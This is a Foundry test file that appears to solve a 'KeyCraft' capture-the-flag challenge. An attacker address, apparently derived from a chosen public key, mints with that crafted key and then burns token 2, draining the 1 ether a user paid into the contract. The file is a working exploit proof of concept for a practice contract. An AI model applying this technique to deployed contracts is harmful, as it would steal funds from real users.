// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");
        // Pass the address generated by the address generation script
        // address: '0x504C3bd2d330170a1AE0a48C377007b906D4B998'
        attacker = 0x504C3bd2d330170a1AE0a48C377007b906D4B998;

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function testKeyCraft() public {
        vm.startPrank(attacker);

        //Solution
        // Pass the public key generated by the address generation script
        // publicKey: '0x0465e5ecb71749c4d7236dfa7ff7f1cbed66b03914ee49369f54386e95fa6823ad590e40ba17d8dd0205d80f5acb7e6cefb6199383b8ed47e7f07e14dcca96dafa'

        k.mint(
            hex"0465e5ecb71749c4d7236dfa7ff7f1cbed66b03914ee49369f54386e95fa6823ad590e40ba17d8dd0205d80f5acb7e6cefb6199383b8ed47e7f07e14dcca96dafa"
        );

        // Pass tok as 2, becasue user already minted tokenid 1
        k.burn(2);
        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }
}
